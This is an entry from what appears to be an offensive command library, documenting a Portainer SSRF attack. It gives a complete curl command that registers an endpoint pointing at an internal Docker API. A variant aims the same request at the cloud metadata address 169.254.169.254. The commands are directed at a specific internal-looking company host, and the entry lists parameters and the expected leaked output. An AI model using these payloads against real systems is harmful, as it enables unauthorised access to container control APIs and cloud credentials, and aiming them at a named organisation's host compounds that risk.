---
id: 123e4567-e89b-12d3-a456-426614174004
name: curl-portainer-ssrf
type: command
executor: bash
data: >-
  curl -X POST https://data-07.uberinternal.com:9443/api/endpoints -H
  "Authorization: Bearer YOUR_JWT" -H "Content-Type: application/json" -d
  '{"name":"internal-docker","endpoint":"http://localhost:2375","public":false}'
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.869Z'
platforms:
  - Linux
  - Web
  - Docker
tags:
  - ssrf
  - portainer
  - docker
verified: false
validated: true
submitted: true
---

# curl-portainer-ssrf

## Command

```bash
curl -X POST https://data-07.uberinternal.com:9443/api/endpoints -H "Authorization: Bearer YOUR_JWT" -H "Content-Type: application/json" -d '{"name":"internal-docker","endpoint":"http://localhost:2375","public":false}'
```

## Description

This command exploits SSRF by creating a Portainer endpoint with an internal URL, causing the server to request the Docker API and potentially leak data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for creating endpoint | Yes |
| `https://data-07.uberinternal.com:9443/api/endpoints` | Portainer endpoints API | Yes |
| `-H "Authorization: Bearer YOUR_JWT"` | Auth header with token | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |
| `-d '{"name":"internal-docker","endpoint":"http://localhost:2375","public":false}'` | Payload with SSRF URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://data-07.uberinternal.com:9443/api/endpoints -H "Authorization: Bearer YOUR_JWT" -H "Content-Type: application/json" -d '{"name":"internal-docker","endpoint":"http://localhost:2375","public":false}'
```

### Advanced Usage

```bash
curl -X POST https://data-07.uberinternal.com:9443/api/endpoints -H "Authorization: Bearer YOUR_JWT" -H "Content-Type: application/json" -d '{"name":"test","endpoint":"http://169.254.169.254/latest/meta-data/", "public":false}' -v
```

## Expected Output

Response includes internal service data, e.g., {"Id":"abc123","Containers":[...]} from Docker API.

## Related

- [[Related Procedure]]
